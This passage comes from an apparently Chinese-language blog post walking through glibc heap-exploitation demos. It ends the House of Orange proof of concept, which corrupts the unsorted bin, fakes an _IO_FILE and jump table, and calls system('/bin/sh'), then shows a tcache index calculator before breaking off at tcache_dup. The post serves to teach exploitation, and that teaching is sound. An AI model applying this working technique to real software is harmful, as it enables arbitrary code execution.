</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Note that this overwrite occurs before the sanity check and therefore, will occur in any
</span></span></span><span class=line><span class=cl><span class=cm>      case.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.
</span></span></span><span class=line><span class=cl><span class=cm>      So, we should set chunk-&gt;bk to be _IO_list_all - 16
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>top</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>io_list_all</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      At the end, the system function will be invoked with the pointer to this file pointer.
</span></span></span><span class=line><span class=cl><span class=cm>      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>memcpy</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>top</span><span class=p>,</span> <span class=s>&#34;/bin/sh</span><span class=se>\x00</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      The function _IO_flush_all_lockp iterates through the file pointer linked-list
</span></span></span><span class=line><span class=cl><span class=cm>      in _IO_list_all.
</span></span></span><span class=line><span class=cl><span class=cm>      Since we can only overwrite this address with main_arena&#39;s unsorted-bin-list,
</span></span></span><span class=line><span class=cl><span class=cm>      the idea is to get control over the memory at the corresponding fd-ptr.
</span></span></span><span class=line><span class=cl><span class=cm>      The address of the next file pointer is located at base_address+0x68.
</span></span></span><span class=line><span class=cl><span class=cm>      This corresponds to smallbin-4, which holds all the smallbins of
</span></span></span><span class=line><span class=cl><span class=cm>      sizes between 90 and 98. For further information about the libc&#39;s bin organisation
</span></span></span><span class=line><span class=cl><span class=cm>      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Since we overflow the old top chunk, we also control it&#39;s size field.
</span></span></span><span class=line><span class=cl><span class=cm>      Here it gets a little bit tricky, currently the old top chunk is in the
</span></span></span><span class=line><span class=cl><span class=cm>      unsortedbin list. For each allocation, malloc tries to serve the chunks
</span></span></span><span class=line><span class=cl><span class=cm>      in this list first, therefore, iterates over the list.
</span></span></span><span class=line><span class=cl><span class=cm>      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
</span></span></span><span class=line><span class=cl><span class=cm>      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
</span></span></span><span class=line><span class=cl><span class=cm>      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
</span></span></span><span class=line><span class=cl><span class=cm>      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
</span></span></span><span class=line><span class=cl><span class=cm>      therefore, occupying the smallbin[4] location in the main_arena and
</span></span></span><span class=line><span class=cl><span class=cm>      eventually representing the fake file pointer&#39;s fd-ptr.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      In addition to sorting, malloc will also perform certain size checks on them,
</span></span></span><span class=line><span class=cl><span class=cm>      so after sorting the old top chunk and following the bogus fd pointer
</span></span></span><span class=line><span class=cl><span class=cm>      to _IO_list_all, it will check the corresponding size field, detect
</span></span></span><span class=line><span class=cl><span class=cm>      that the size is smaller than MINSIZE &#34;size &lt;= 2 * SIZE_SZ&#34;
</span></span></span><span class=line><span class=cl><span class=cm>      and finally triggering the abort call that gets our chain rolling.
</span></span></span><span class=line><span class=cl><span class=cm>      Here is the corresponding code in the libc:
</span></span></span><span class=line><span class=cl><span class=cm>      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>top</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x61</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      Now comes the part where we satisfy the constraints on the fake file pointer
</span></span></span><span class=line><span class=cl><span class=cm>      required by the function _IO_flush_all_lockp and tested here:
</span></span></span><span class=line><span class=cl><span class=cm>      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      We want to satisfy the first condition:
</span></span></span><span class=line><span class=cl><span class=cm>      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>_IO_FILE</span> <span class=o>*</span><span class=n>fp</span> <span class=o>=</span> <span class=p>(</span><span class=n>_IO_FILE</span> <span class=o>*</span><span class=p>)</span> <span class=n>top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      1. Set mode to 0: fp-&gt;_mode &lt;= 0
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// top+0xc0
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=mi>2</span><span class=p>;</span> <span class=c1>// top+0x20
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=mi>3</span><span class=p>;</span> <span class=c1>// top+0x28
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      4) Finally set the jump table to controlled memory and place system there.
</span></span></span><span class=line><span class=cl><span class=cm>      The jump table pointer is right after the _IO_FILE struct:
</span></span></span><span class=line><span class=cl><span class=cm>      base_address+sizeof(_IO_FILE) = jump_table
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=o>*</span><span class=n>jump_table</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>top</span><span class=p>[</span><span class=mi>12</span><span class=p>];</span> <span class=c1>// controlled memory
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>jump_table</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>size_t</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>winner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>fp</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>_IO_FILE</span><span class=p>))</span> <span class=o>=</span> <span class=p>(</span><span class=n>size_t</span><span class=p>)</span> <span class=n>jump_table</span><span class=p>;</span> <span class=c1>// top+0xd8
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* Finally, trigger the whole chain by calling malloc */</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     The libc&#39;s error message will be printed to the screen
</span></span></span><span class=line><span class=cl><span class=cm>     But you&#39;ll get a shell anyways.
</span></span></span><span class=line><span class=cl><span class=cm>   */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>winner</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出就没有必要放了。</p><p>先申请了实际大小为 0x400 的 chunk，然后为了满足页对齐以及 top chunk 的 <code>PREV_INUSE</code> 位的条件，通过溢出修改 top chunk 的 <code>size</code> 为 <code>0xc01</code>。此时，如果我们再申请一个 top chunk 大小不能满足的 chunk，就会申请新的 top chunk，而 old top 进入 unsorted bin 中。</p><p>接下来，我们利用 libc 的异常处理程序 getshell。出现异常并终止程序时，会调用 <code>_IO_flush_all_lockp</code>，遍历 <code>_IO_list_all</code> 并对它们依次调用 <code>_IO_OVERFLOW</code>。不难想到，如果伪造 <code>_IO_list_all</code> 指针的前 8 字节为 <code>/bin/sh\x00</code>，再伪造 <code>_IO_OVERFLOW</code> 为 <code>system</code>，就可以达到目的。其中，<code>_IO_list_all</code> 地址可由已经在 unsorted bin 中的 old top 的 fd 也就是 <code>main_arena+88</code> 推算出来。</p><p>如果我们后续要切割这块 old top 来满足内存申请，那么 <code>old_top->bk->fd</code> 会被覆盖为 <code>main_arena+88</code>，这和 unsorted bin attack 涉及的原理是一样的。那么我们希望覆盖 <code>_IO_list_all</code> 为 <code>main_arena+88</code>，只需要令 <code>old_top->bk = io_list_all-0x10</code> 即可，其中 <code>io_list_all</code> 表示 <code>_IO_list_all</code> 的地址。但问题在于，用于覆盖的值 <code>main_arena+88</code> 不是我们可控的值，因此我们期望能控制其 fd 指针。</p><p>已知下一个文件指针位于文件指针地址 <code>+0x68</code> 处，这恰好对应于 <code>smallbin[4]</code>，存放大小为 <code>90-98</code> 之间的 small chunk。如果我们设置 old top 的大小为 <code>0x61</code>，然后申请一个小块使得 old top 不会被分配出去，那么它就会进入到 <code>smallbin[4]</code> 中，成为链表头，同时也成为了我们伪造的文件指针的 fd 指针。</p><p>然后用 old top 伪造文件指针，满足这几个条件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      1. Set mode to 0: fp-&gt;_mode &lt;= 0
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// top+0xc0
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=mi>2</span><span class=p>;</span> <span class=c1>// top+0x20
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=mi>3</span><span class=p>;</span> <span class=c1>// top+0x28
</span></span></span></code></pre></td></tr></table></div></div><p>最后，覆盖 <code>_IO_jump_t[3]</code> 也就是 <code>_IO_OVERFLOW</code> 使其指向 <code>winner</code> 函数，或者说 <code>system</code> 函数。</p><h2 id=calc_tcache_size>calc_tcache_size</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>malloc_chunk</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>size_t</span>      <span class=n>mchunk_prev_size</span><span class=p>;</span>  <span class=cm>/* Size of previous chunk (if free).  */</span>
</span></span><span class=line><span class=cl>  <span class=n>size_t</span>      <span class=n>mchunk_size</span><span class=p>;</span>       <span class=cm>/* Size in bytes, including overhead. */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>fd</span><span class=p>;</span>         <span class=cm>/* double links -- used only if free. */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>bk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Only used for large blocks: pointer to next larger size.  */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>fd_nextsize</span><span class=p>;</span> <span class=cm>/* double links -- used only if free. */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>bk_nextsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* The corresponding word size.  */</span>
</span></span><span class=line><span class=cl><span class=cp>#define SIZE_SZ (sizeof (size_t))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \
</span></span></span><span class=line><span class=cl><span class=cp>			  ? __alignof__ (long double) : 2 * SIZE_SZ)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* The corresponding bit mask value.  */</span>
</span></span><span class=line><span class=cl><span class=cp>#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* The smallest possible chunk */</span>
</span></span><span class=line><span class=cl><span class=cp>#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* The smallest size we can malloc is an aligned minimal chunk */</span>
</span></span><span class=line><span class=cl><span class=cp>#define MINSIZE  \
</span></span></span><span class=line><span class=cl><span class=cp>  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define request2size(req)                                         \
</span></span></span><span class=line><span class=cl><span class=cp>  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt;MINSIZE)  ?             \
</span></span></span><span class=line><span class=cl><span class=cp>   MINSIZE :                                                      \
</span></span></span><span class=line><span class=cl><span class=cp>   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* When &#34;x&#34; is from chunksize().  */</span>
</span></span><span class=line><span class=cl><span class=cp># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* When &#34;x&#34; is a user-provided size.  */</span>
</span></span><span class=line><span class=cl><span class=cp># define usize2tidx(x) csize2tidx (request2size (x))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>req</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>tidx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file doesn&#39;t demonstrate an attack, but calculates the tcache idx for a given chunk size.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The basic formula is as follows:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>On a 64 bit system the current values are:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>MINSIZE: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MINSIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>MALLOC_ALIGNMENT: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MALLOC_ALIGNMENT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>So we get the following equation:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>(IDX = CHUNKSIZE - 0x%lx) / 0x%lx</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MINSIZE</span><span class=o>-</span><span class=n>MALLOC_ALIGNMENT</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>MALLOC_ALIGNMENT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;BUT be AWARE that CHUNKSIZE is not the x in malloc(x)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;It is calculated as follows:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>IF x &lt;MINSIZE(0x%lx) CHUNKSIZE = MINSIZE (0x%lx)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MINSIZE</span><span class=p>,</span> <span class=n>MINSIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>=&gt; CHUNKSIZE = (x + 0x%lx + 0x%lx) &amp; ~0x%lx)</span><span class=se>\n\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=n>MALLOC_ALIGN_MASK</span><span class=p>,</span> <span class=n>MALLOC_ALIGN_MASK</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%llx&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>req</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>tidx</span> <span class=o>=</span> <span class=n>usize2tidx</span><span class=p>(</span><span class=n>req</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>tidx</span><span class=o>&gt;</span> <span class=mi>63</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>WARNING: NOT IN TCACHE RANGE!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>TCache Idx: %llu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>tidx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file doesn&#39;t demonstrate an attack, but calculates the tcache idx for a given chunk size.
</span></span><span class=line><span class=cl>The basic formula is as follows:
</span></span><span class=line><span class=cl>	(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
</span></span><span class=line><span class=cl>	On a 64 bit system the current values are:
</span></span><span class=line><span class=cl>		MINSIZE: 0x20
</span></span><span class=line><span class=cl>		MALLOC_ALIGNMENT: 0x10
</span></span><span class=line><span class=cl>	So we get the following equation:
</span></span><span class=line><span class=cl>	(IDX = CHUNKSIZE - 0x11) / 0x10
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>BUT be AWARE that CHUNKSIZE is not the x in malloc(x)
</span></span><span class=line><span class=cl>It is calculated as follows:
</span></span><span class=line><span class=cl>	IF x &lt;MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
</span></span><span class=line><span class=cl>	ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
</span></span><span class=line><span class=cl>	=&gt; CHUNKSIZE = (x + 0x8 + 0xf) &amp; ~0xf)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x10
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TCache Idx: 0
</span></span></code></pre></td></tr></table></div></div><p>关于 tcache 介绍可以参考 <a href=http://tukan.farm/2017/07/08/tcache/ target=_blank rel="noopener noreffer">这里</a>。</p><p>这个例子说明了 tcache 的索引是如何分配的，需要注意的是 <code>CHUNKSIZE</code> 是经过 <code>request2size</code> 转化后的大小，也就是 chunk 的实际大小。tcache 索引 <code>IDX</code> 可以由上面的公式得到。</p><h2 id=tcache_dup>tcache_dup</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
